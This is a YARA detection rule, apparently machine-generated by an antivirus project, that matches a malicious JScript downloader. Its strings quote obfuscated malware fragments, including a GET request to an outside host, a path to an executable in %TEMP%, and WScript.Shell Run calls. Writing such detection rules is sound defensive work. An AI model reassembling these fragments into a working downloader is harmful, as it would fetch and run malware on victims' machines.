rule sig_20160328_dca8a6c067cf2ba3df34028aa636ce2a {
  meta:
    description = "datamaliciousorder - file 20160328_dca8a6c067cf2ba3df34028aa636ce2a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a72f31adc5a645ebe635337fc9b5dfcdba6beb856fe0c99f84587a93124ad2d3"

  strings:
    $s1  = "function Mohusli() {return Qbvpxms[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SHwnOzhZ.exe\";};" fullword ascii
    $s2  = "Elxeuopp[Wvemp](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Pcoxgfz](Ecmvld() * 11)} while (Elxeuopp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ndawasmp(Vzyziln, Ieuskosfa){return Vzyziln - Ieuskosfa;};" fullword ascii
    $s5  = "var Qbvpxms = function Jvytfus() {return WScript[Dnamydcvap](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dsyqhgig() {return ((Iflqg == true) && (Iflqg == Mpczxvgr)) ? 1 : Lmcrmrc;};" fullword ascii
    $s7  = "function Trxwdr(Ujurbt){Qbvpxms[\"Run\"](Ujurbt, Lmcrmrc, Lmcrmrc);};" fullword ascii
    $s8  = "function Hxbzafx()" fullword ascii
    $s9  = "var Mpczxvgr = false;" fullword ascii
    $s10 = "function Ecmvld(){return 22;};" fullword ascii
    $s11 = "function Uglpff(){return Dnamydcvap;};" fullword ascii
    $s12 = "function Ihjglqxun(){return Cexrkkq;};" fullword ascii
    $s13 = " while (Hrikpb){" fullword ascii
    $s14 = "return Ndawasmp(Vivlq, Npkfshmocj);" fullword ascii
    $s15 = "function Wvcnsqsxf(Gyrzdrsycc) {var Dwkiuoepe = (1, 2, 3, 4, 5, Gyrzdrsycc); return Dwkiuoepe;};" fullword ascii
    $s16 = "var Cwzvq = false;" fullword ascii
    $s17 = "var Iflqg = false;" fullword ascii
    $s18 = "var Haibyhs = new this[\"Date\"]();" fullword ascii
    $s19 = "Iflqg = true; " fullword ascii
    $s20 = "Mpczxvgr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}